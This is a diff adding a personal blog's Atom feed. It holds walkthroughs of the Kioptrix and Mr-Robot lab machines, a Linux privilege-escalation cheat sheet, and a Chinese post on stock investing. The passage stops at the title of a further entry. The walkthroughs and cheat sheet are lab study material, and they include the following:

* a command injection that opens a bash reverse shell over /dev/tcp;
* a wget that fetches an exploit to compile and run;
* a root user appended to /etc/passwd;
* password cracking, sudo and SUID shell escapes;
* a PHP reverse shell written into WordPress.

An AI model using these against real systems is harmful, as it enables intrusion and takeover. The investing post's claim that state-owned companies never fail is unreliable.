@@ -1,0 +1,1358 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://yidwfnyetg.github.io</id>
+    <title>Sterben</title>
+    <updated>2023-04-18T12:27:10.304Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://yidwfnyetg.github.io"/>
+    <link rel="self" href="https://yidwfnyetg.github.io/atom.xml"/>
+    <subtitle>In search of the ultimate in the world</subtitle>
+    <logo>https://yidwfnyetg.github.io/images/avatar.png</logo>
+    <icon>https://yidwfnyetg.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, Sterben</rights>
+    <entry>
+        <title type="html"><![CDATA[Kioptrix level 3]]></title>
+        <id>https://yidwfnyetg.github.io/post/kioptrix-level-3/</id>
+        <link href="https://yidwfnyetg.github.io/post/kioptrix-level-3/">
+        </link>
+        <updated>2023-03-22T03:49:45.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="information-gathering">Information gathering</h1>
+<pre><code>netdiscover -r 192.168.124.0/24
+nmap -Pn -sV -T4 -O -p- 192.168.124.146
+nmap --script vuln -p- 192.168.124.146
+dirb http://192.168.124.146 /usr/share/wordlists/dirb/big.txt
+nikto -host 192.168.124.146
+</code></pre>
+<h1 id="method-1">Method-1</h1>
+<h2 id="get-shell">Get shell</h2>
+<p>We find a login page which buid with lotuscms.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1679477677475.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1679477546500.png" alt="" loading="lazy"><br>
+Attention,meterpreter is unavailable sometimes.We need to change payload.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1679477759672.png" alt="" loading="lazy"></p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>The information of this system is as follows.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1679477868752.png" alt="" loading="lazy"></p>
+<h1 id="enclosure">Enclosure</h1>
+<figure data-type="image" tabindex="1"><img src="https://yidwfnyetg.github.io/post-images/1679457478123.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Kioptrix level 2]]></title>
+        <id>https://yidwfnyetg.github.io/post/kioptrix-level-2/</id>
+        <link href="https://yidwfnyetg.github.io/post/kioptrix-level-2/">
+        </link>
+        <updated>2023-03-21T07:07:20.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="infromation-gathering">Infromation gathering</h1>
+<pre><code>netdiscover -r 192.168.124.0/24
+nmap -Pn -sV -T4 -p- 192.168.124.145
+nmap --script vuln 192.168.124.145
+dirb http://192.168.124.145 /usr/share/wordlists/dirb/big.txt
+nikto -host 192.168.124.145
+</code></pre>
+<h1 id="method-1">Method-1</h1>
+<h2 id="get-a-shell">Get a shell</h2>
+<p>There is a sql injection vulnerability in log in page.</p>
+<pre><code>sqlmap -r 1.txt --level 3 --risk 3 --threads 10 --dbms mysql --current-db
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1679451569042.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1679452250882.png" alt="" loading="lazy"><br>
+Or we can use universal password to log in.</p>
+<pre><code>' or '1'='1
+</code></pre>
+<p>Next,there is a commond injection.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1679452390583.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1679452397248.png" alt="" loading="lazy"></p>
+<pre><code>nc -lvnp 9999                       [ //]:Run this commond on kali
+127.0.0.1&amp;bash -i &gt;&amp; /dev/tcp/192.168.124.4/9999 0&gt;&amp;1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://yidwfnyetg.github.io/post-images/1679453259787.png" alt="" loading="lazy"></figure>
+<h2 id="privilege-escalaion">Privilege escalaion</h2>
+<pre><code>searchsploit RHEL 4
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1679455848121.png" alt="" loading="lazy"><br>
+Use 9545.c<br>
+Excute these commonds on kali</p>
+<pre><code>search -m 9545
+</code></pre>
+<pre><code>python3 -m http.server 9999
+</code></pre>
+<p>Excute these commonds on shell</p>
+<pre><code>cd /tmp
+wget http://192.168.124.4:9999/9545.c
+gcc -o 9545 9545.c
+chmod a+x 9545
+./9545
+</code></pre>
+<h1 id="enclusure">Enclusure</h1>
+<figure data-type="image" tabindex="2"><img src="https://yidwfnyetg.github.io/post-images/1679451049608.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Kioptrix level 1]]></title>
+        <id>https://yidwfnyetg.github.io/post/kioptrix-level-1/</id>
+        <link href="https://yidwfnyetg.github.io/post/kioptrix-level-1/">
+        </link>
+        <updated>2023-03-06T01:44:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="information-gathering">Information gathering</h1>
+<pre><code>netdiscover -r 192.168.124.0/24
+nmap -Pn -T4 -sV -O 192.168.124.140 -p-
+nmap --script vuln 192.168.124.140 -p-
+dirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt
+</code></pre>
+<h1 id="method-1-samba">Method-1  Samba</h1>
+<p><img src="https://yidwfnyetg.github.io/post-images/1679306030928.png" alt="" loading="lazy"><br>
+Attentions please,meterpreter is not availiable<br>
+It's root.There is no need to escalate privilege.</p>
+<h1 id="method-2-openfuck-mod_ssl-vulnerability">Method-2 OpenFuck mod_ssl vulnerability</h1>
+<pre><code>searchsploit mod_ssl 2.8.4
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://yidwfnyetg.github.io/post-images/1679366939593.png" alt="" loading="lazy"></figure>
+<pre><code>searchsploit -p 47080
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://yidwfnyetg.github.io/post-images/1679366949376.png" alt="" loading="lazy"></figure>
+<p><img src="https://yidwfnyetg.github.io/post-images/1679366954478.png" alt="" loading="lazy"><br>
+We need install libssl-dev first.</p>
+<pre><code>gcc -o OpenFuck 47080.c -lcrypto
+./OpenFuck
+./OpenFuck 0x6b 192.168.124.140 443 -c 40
+</code></pre>
+<p>There are some errors in compile process.</p>
+<h1 id="enclosure">Enclosure</h1>
+<figure data-type="image" tabindex="3"><img src="https://yidwfnyetg.github.io/post-images/1678960944499.png" alt="" loading="lazy"></figure>
+<p><img src="https://yidwfnyetg.github.io/post-images/1678960950947.png" alt="" loading="lazy"><br>
+`Nmap scan report for bogon (192.168.124.140)<br>
+Host is up (0.0021s latency).<br>
+Not shown: 65529 closed tcp ports (reset)<br>
+PORT     STATE SERVICE     VERSION<br>
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)<br>
+| vulners:<br>
+|   cpe:/a:openbsd:openssh:2.9p2:<br>
+|       CVE-2002-0640   10.0    https://vulners.com/cve/CVE-2002-0640<br>
+|       CVE-2002-0639   10.0    https://vulners.com/cve/CVE-2002-0639<br>
+|       CVE-2002-0083   10.0    https://vulners.com/cve/CVE-2002-0083<br>
+|       CVE-2011-2895   9.3     https://vulners.com/cve/CVE-2011-2895<br>
+|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051<br>
+|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924<br>
+|       CVE-2003-1562   7.6     https://vulners.com/cve/CVE-2003-1562<br>
+|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478<br>
+|       CVE-2002-0575   7.5     https://vulners.com/cve/CVE-2002-0575<br>
+|       CVE-2001-1459   7.5     https://vulners.com/cve/CVE-2001-1459<br>
+|       CVE-2001-1380   7.5     https://vulners.com/cve/CVE-2001-1380<br>
+|       CVE-2001-0816   7.5     https://vulners.com/cve/CVE-2001-0816<br>
+|       SECURITYVULNS:VULN:1956 7.2     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956<br>
+|       CVE-2001-0529   7.2     https://vulners.com/cve/CVE-2001-0529<br>
+|       SSV:64479       5.0     https://vulners.com/seebug/SSV:64479    <em>EXPLOIT</em><br>
+|       SSV:6192        5.0     https://vulners.com/seebug/SSV:6192     <em>EXPLOIT</em><br>
+|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    <em>EXPLOIT</em><br>
+|       SSV:16847       5.0     https://vulners.com/seebug/SSV:16847    <em>EXPLOIT</em><br>
+|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       <em>EXPLOIT</em><br>
+|       PACKETSTORM:54435       5.0     https://vulners.com/packetstorm/PACKETSTORM:54435       <em>EXPLOIT</em><br>
+|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    <em>EXPLOIT</em><br>
+|       EDB-ID:3303     5.0     https://vulners.com/exploitdb/EDB-ID:3303       <em>EXPLOIT</em><br>
+|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107<br>
+|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243<br>
+|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052<br>
+|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    <em>EXPLOIT</em><br>
+|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    <em>EXPLOIT</em><br>
+|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    <em>EXPLOIT</em><br>
+|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       <em>EXPLOIT</em><br>
+|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537<br>
+|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814<br>
+|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327<br>
+|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259<br>
+|       SECURITYVULNS:VULN:1953 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953<br>
+|       SECURITYVULNS:VULN:1608 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608<br>
+|       SECURITYVULNS:VULN:1499 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499<br>
+|       SECURITYVULNS:VULN:1488 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488<br>
+|       SECURITYVULNS:VULN:1474 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474<br>
+|       SECURITYVULNS:VULN:1439 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439<br>
+|       SECURITYVULNS:VULN:1344 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344<br>
+|       SECURITYVULNS:VULN:1262 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262<br>
+|_      SECURITYVULNS:VULN:1233 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233<br>
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br>
+| http-enum:<br>
+|   /test.php: Test page<br>
+|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'<br>
+|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'<br>
+|_  /usage/: Potentially interesting folder<br>
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.<br>
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br>
+|_http-trace: TRACE is enabled<br>
+|<em>http-dombased-xss: Couldn't find any DOM based XSS.<br>
+|<em>http-csrf: Couldn't find any CSRF vulnerabilities.<br>
+111/tcp  open  rpcbind     2 (RPC #100000)<br>
+| rpcinfo:<br>
+|   program version    port/proto  service<br>
+|   100000  2            111/tcp   rpcbind<br>
+|   100000  2            111/udp   rpcbind<br>
+|   100024  1           1024/tcp   status<br>
+|</em>  100024  1           1024/udp   status<br>
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)<br>
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br>
+| ssl-dh-params:<br>
+|   VULNERABLE:<br>
+|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br>
+|     State: VULNERABLE<br>
+|     IDs:  BID:74733  CVE:CVE-2015-4000<br>
+|       The Transport Layer Security (TLS) protocol contains a flaw that is<br>
+|       triggered when handling Diffie-Hellman key exchanges defined with<br>
+|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br>
+|       to downgrade the security of a TLS session to 512-bit export-grade<br>
+|       cryptography, which is significantly weaker, allowing the attacker<br>
+|       to more easily break the encryption and monitor or tamper with<br>
+|       the encrypted stream.<br>
+|     Disclosure date: 2015-5-19<br>
+|     Check results:<br>
+|       EXPORT-GRADE DH GROUP 1<br>
+|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br>
+|             Modulus Type: Safe prime<br>
+|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus<br>
+|             Modulus Length: 512<br>
+|             Generator Length: 8<br>
+|             Public Key Length: 512<br>
+|     References:<br>
+|       https://weakdh.org<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000<br>
+|       https://www.securityfocus.com/bid/74733<br>
+|<br>
+|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>
+|     State: VULNERABLE<br>
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups<br>
+|       of insufficient strength, especially those using one of a few commonly<br>
+|       shared groups, may be susceptible to passive eavesdropping attacks.<br>
+|     Check results:<br>
+|       WEAK DH GROUP 1<br>
+|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA<br>
+|             Modulus Type: Safe prime<br>
+|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus<br>
+|             Modulus Length: 1024<br>
+|             Generator Length: 8<br>
+|             Public Key Length: 1024<br>
+|     References:<br>
+|</em>      https://weakdh.org<br>
+|<em>http-dombased-xss: Couldn't find any DOM based XSS.<br>
+| ssl-ccs-injection:<br>
+|   VULNERABLE:<br>
+|   SSL/TLS MITM vulnerability (CCS Injection)<br>
+|     State: VULNERABLE<br>
+|     Risk factor: High<br>
+|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h<br>
+|       does not properly restrict processing of ChangeCipherSpec messages,<br>
+|       which allows man-in-the-middle attackers to trigger use of a zero<br>
+|       length master key in certain OpenSSL-to-OpenSSL communications, and<br>
+|       consequently hijack sessions or obtain sensitive information, via<br>
+|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.<br>
+|<br>
+|     References:<br>
+|       http://www.openssl.org/news/secadv_20140605.txt<br>
+|       http://www.cvedetails.com/cve/2014-0224<br>
+|</em>      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224<br>
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br>
+|<em>http-csrf: Couldn't find any CSRF vulnerabilities.<br>
+| ssl-poodle:<br>
+|   VULNERABLE:<br>
+|   SSL POODLE information leak<br>
+|     State: VULNERABLE<br>
+|     IDs:  BID:70574  CVE:CVE-2014-3566<br>
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other<br>
+|           products, uses nondeterministic CBC padding, which makes it easier<br>
+|           for man-in-the-middle attackers to obtain cleartext data via a<br>
+|           padding-oracle attack, aka the &quot;POODLE&quot; issue.<br>
+|     Disclosure date: 2014-10-14<br>
+|     Check results:<br>
+|       TLS_RSA_WITH_3DES_EDE_CBC_SHA<br>
+|     References:<br>
+|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>
+|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>
+|</em>      https://www.securityfocus.com/bid/70574<br>
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.<br>
+|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)<br>
+|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)<br>
+|_sslv2-drown: ERROR: Script execution failed (use -d to debug)<br>
+1024/tcp open  status      1 (RPC #100024)<br>
+MAC Address: 00:0C:29:7C:3A:16 (VMware)</p>
+<p>Host script results:<br>
+| smb-vuln-cve2009-3103:<br>
+|   VULNERABLE:<br>
+|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)<br>
+|     State: VULNERABLE<br>
+|     IDs:  CVE:CVE-2009-3103<br>
+|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,<br>
+|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a<br>
+|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE<br>
+|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,<br>
+|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;<br>
+|<br>
+|     Disclosure date: 2009-09-08<br>
+|     References:<br>
+|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103<br>
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103<br>
+|_smb-vuln-ms10-054: false<br>
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]<br>
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]</p>
+<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+Nmap done: 1 IP address (1 host up) scanned in 356.82 seconds`</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Mandatory manual]]></title>
+        <id>https://yidwfnyetg.github.io/post/mandatory-manual/</id>
+        <link href="https://yidwfnyetg.github.io/post/mandatory-manual/">
+        </link>
+        <updated>2023-02-16T03:27:52.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="1-information-gathering">1 Information gathering</h1>
+<h2 id="11-port-scan">1.1 Port scan</h2>
+<pre><code>netdiscover -r 192.168.124.0/24
+nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-
+</code></pre>
+<h2 id="12-web-scan">1.2 Web scan</h2>
+<pre><code>dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt
+nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt
+</code></pre>
+<hr>
+<h1 id="2-vulnerability-analysis">2 Vulnerability analysis</h1>
+<p>Use nc to view banner.</p>
+<pre><code>nc -nv 192.168.124.44 22
+</code></pre>
+<pre><code>searchsploit &lt;service name&gt;
+searchsploit -m 47080
+</code></pre>
+<hr>
+<h1 id="3-exploitation">3 Exploitation</h1>
+<h2 id="smb">smb</h2>
+<pre><code>enum4linux 192.168.124.40
+smbclient -L 192.168.124.40
+</code></pre>
+<hr>
+<h1 id="4-privilege-escalation">4 Privilege escalation</h1>
+<h2 id="41-linux">4.1 Linux</h2>
+<h3 id="411-kernel-stack-overflow">4.1.1 Kernel stack overflow</h3>
+<pre><code>uname -a
+cat /etc/*-release
+searchsploit linux 3.10 CentOS Linux 7
+</code></pre>
+<p>use tools</p>
+<pre><code>./linux-exploit-suggester-2.pl
+</code></pre>
+<p>Take the rights of dirty-cow as an example</p>
+<pre><code>gcc -pthread dirty.c -lcrypt -o dirty
+chmod +x dirty
+./dirty fly
+</code></pre>
+<h3 id="412-plain-password-of-root">4.1.2 Plain password of root</h3>
+<p>If /etc/passwd can be write by common user.</p>
+<pre><code>openssl passwd -1 -salt hacker 123456
+</code></pre>
+<p>generate <code>$1$hacker$4o50Z4aoUGaLMC0Rg4Io40</code></p>
+<pre><code>echo 'hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash' &gt;&gt; /etc/passwd
+</code></pre>
+<p>Then login in user hacker</p>
+<p>If /etc/shadow can be read by common user.</p>
+<pre><code>unshadow /etc/passwd /etc/shadow &gt; shadow.txt
+chmod 777 shadow.txt
+john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt
+</code></pre>
+<h3 id="413-password-reuse">4.1.3 Password reuse</h3>
+<h3 id="414-sudo-abuse">4.1.4 Sudo abuse</h3>
+<p><code>sudo -l</code></p>
+<blockquote>
+<p>https://gtfobins.github.io/</p>
+</blockquote>
+<p>For example:<code>su,    awk,    man </code></p>
+<pre><code>sudo su
+</code></pre>
+<pre><code>sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
+</code></pre>
+<pre><code>sudo man man
+!/bin/sh
+</code></pre>
+<pre><code>sudo vim -c ':!/bin/sh'
+</code></pre>
+<h3 id="415-su-root-prohibited">4.1.5 'su root' prohibited</h3>
+<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/sh&quot;)
+sudo su
+</code></pre>
+<h3 id="416-scheduled-task">4.1.6 Scheduled task</h3>
+<pre><code>ls -l /etc/cron*
+cat /etc/crontab
+</code></pre>
+<p>If there is a scheduled task named 1.py</p>
+<pre><code>ls -al /tmp/1.py    //查看是否有w权限
+</code></pre>
+<p>Write the code into 1.py</p>
+<pre><code>import os 
+os.system('cp /bin/sh /tmp/sh') 
+os.system('chmod u+s /tmp/sh')
+</code></pre>
+<p><code>./tmp/sh</code></p>
+<h3 id="417-suid">4.1.7 SUID</h3>
+<p>Take nmap as an example:</p>
+<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null
+/usr/local/bin/nmap --interactive
+!sh
+whoami
+</code></pre>
+<h3 id="418-environment-variable-hijacking">4.1.8 Environment variable hijacking</h3>
+<p>Find command with suid just as 4.1.7.<br>
+Suppose it is <code>su</code></p>
+<pre><code>vim /tmp/su         //write shellcode into su
+export PATH=/tmp:$PATH
+</code></pre>
+<h3 id="419-administrator-configuration-error">4.1.9 Administrator configuration error</h3>
+<p>Configuring a program with SUID that does not have the setuid(0) code, such as <code>find </code>mentioned above.</p>
+<pre><code>mkdir abc
+find abc -exec '/bin/sh' \;
+</code></pre>
+<h3 id="4110-docker-group">4.1.10 Docker group</h3>
+<h3 id="4111-service-vulnerability">4.1.11 Service vulnerability</h3>
+<p><code>netstat -antup</code><br>
+Redis reverse shell.</p>
+<pre><code>nc -l 12345 | nc 102.168.191.170 80
+</code></pre>
+<h2 id="windows">Windows</h2>
+<hr>
+<h1 id="5-domain-penetration">5 Domain penetration</h1>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Mr-Robot]]></title>
+        <id>https://yidwfnyetg.github.io/post/mr-robot/</id>
+        <link href="https://yidwfnyetg.github.io/post/mr-robot/">
+        </link>
+        <updated>2023-02-09T06:22:52.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="information-gathering">Information gathering</h1>
+<pre><code>netdiscover -r 192.168.124.0/24
+nmap -sV -O -Pn -T4 192.168.124.80 -p-
+nmap --script vuln 192.168.124.80 -p-
+dirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt
+</code></pre>
+<p>Found login page<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675935901724.PNG" alt="" loading="lazy"><br>
+The wordlist of fsocity.dic<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675935906897.PNG" alt="" loading="lazy"></p>
+<p>The first key</p>
+<figure data-type="image" tabindex="1"><img src="https://yidwfnyetg.github.io/post-images/1675935911648.PNG" alt="" loading="lazy"></figure>
+<hr>
+<h1 id="method-1">Method-1</h1>
+<h2 id="exploit-wordpress">Exploit wordpress</h2>
+<p>sort and uniq</p>
+<pre><code>sort fsocity.dic | uniq &gt; fsocity-sort.dic
+</code></pre>
+<p>Hydra enumerate users</p>
+<pre><code>hydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:Invalid username&quot;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://yidwfnyetg.github.io/post-images/1675935995098.PNG" alt="" loading="lazy"></figure>
+<p>Wpscan intrude users and password</p>
+<pre><code>wpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://yidwfnyetg.github.io/post-images/1675936001210.PNG" alt="" loading="lazy"></figure>
+<p>[Valid Combinations Found:<br>
+Username: Elliot, Password: ER28-0652<br>
+Login in wordpress</p>
+<hr>
+<h2 id="getshell">Getshell</h2>
+<p>Visit Appearance-Editor,write shell code into 404.php<br>
+There are plenty of webshell in /usr/share/webbshells/php/<br>
+Use php-reverse-shell.php<br>
+Remember to change its ip and port<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675936011245.png" alt="" loading="lazy"></p>
+<p>listen port 1234 on kali.<br>
+Then  visit any pay which  not exists.<br>
+<code>nc -lvnp 1234</code><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675936061435.PNG" alt="" loading="lazy"></p>
+<p>Found another user robot and its file<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675936067906.PNG" alt="" loading="lazy"></p>
+<p>Decode password<br>
+Write 'c3fcd3d76192e4007dfb496cca67e13b' into hash.txt</p>
+<pre><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675936335560.PNG" alt="" loading="lazy"><br>
+Turn to user robot</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 
+su robot
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://yidwfnyetg.github.io/post-images/1675936356620.PNG" alt="" loading="lazy"></figure>
+<hr>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>Try to escalate privilege through suid<br>
+Find all the suid file.</p>
+<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675936394011.png" alt="" loading="lazy"><br>
+Nmap privilege escalation<br>
+Only can be used when nmap is version 2.02-5.21</p>
+<pre><code>/usr/local/bin/nmap --interactive
+!sh
+whoami
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675936402754.PNG" alt="" loading="lazy"><br>
+<code>cat /root/key-3-of-3.txt</code></p>
+<hr>
+<h1 id="enclosure">Enclosure</h1>
+<figure data-type="image" tabindex="5"><img src="https://yidwfnyetg.github.io/post-images/1675935870791.PNG" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://yidwfnyetg.github.io/post-images/1675935877529.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://yidwfnyetg.github.io/post-images/1675935887078.PNG" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Principles of investment]]></title>
+        <id>https://yidwfnyetg.github.io/post/two-principles-of-investment/</id>
+        <link href="https://yidwfnyetg.github.io/post/two-principles-of-investment/">
+        </link>
+        <updated>2023-02-06T07:59:10.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="historical-cycle-rate">Historical cycle rate</h1>
+<figure data-type="image" tabindex="1"><img src="https://yidwfnyetg.github.io/post-images/1675670370557.PNG" alt="" loading="lazy"></figure>
+<p>Cycle：1 year<br>
+Base point：Spring festival<br>
+Buy point：(45,135)，(226,315)<br>
+Sale point：(136,225)，(316,360)</p>
+<p><strong>The area of application</strong><br>
+对于股票大行情，板块，周期率尤为明显，而对于个股，不确定性太高。所以最适用周期率的理财产品是行业基金。<br>
+概率和市场规律优先，不要被其它言论和小道消息左右。<br>
+在春节前务必将仓位清空。</p>
+<hr>
+<h1 id="value-investment">Value investment</h1>
+<p><strong>Two keypoints</strong><br>
+<code>Buy at a low price </code><br>
+<code>Hold for a long time</code></p>
+<p><strong>difficulty</strong><br>
+The most difficult is how to judge the value of stock.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675672277087.jpg" alt="" loading="lazy"></p>
+<h1 id="state-owned-enterprise">State-owned enterprise</h1>
+<pre><code>炒股也有一些年头了，也交了一些学费，回顾自己的炒股历程，赚钱的都是小赚，亏钱的都是巨亏。细究原因，其实很简单，无非以下几种情况：
+1.股票最近几次涨停，想着接下来还会涨停，短线捞一波就走，买入后急转直下，慌了，买了，巨额亏损，事实上后面这股能涨回来，只是需几年。
+2.股标频繁波动，做T赚点小钱，开始疯涨后，不敢跟了。
+3.股票处于低位，买入后仍下跌，涨回后赶紧卖出。
+4.股票处于低位，涨了一波后下跌，吓得赶紧跑，卖了后又涨。
+5.股票处于低位，涨了一波后下跌，涨回后卖了，错失好牌。
+
+根本原因：
+1. 对于股票的价值及可能的风险没有清醒的认识，只是投机而已，稍有风吹草动就怀疑自己了。
+2. 没有严谨的交易规则，多数决定都是拍脑袋，但拍脑袋的决定大多情况下是错的。
+</code></pre>
+<pre><code>**解决办法**
+1.只炒自己知道的行业，只买国企
+2.买入股票后，挂条件单，预估可达到的收益，至少50%收益卖出
+3.国企不会倒闭，坚决不割肉，哪怕买在半山腰（想想2020年的石油）
+4.禁止做T，防踏空。
+5.禁止追涨
+6.预估少于50%收益的坚决不买，少做不错
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Common process for handling objectives]]></title>
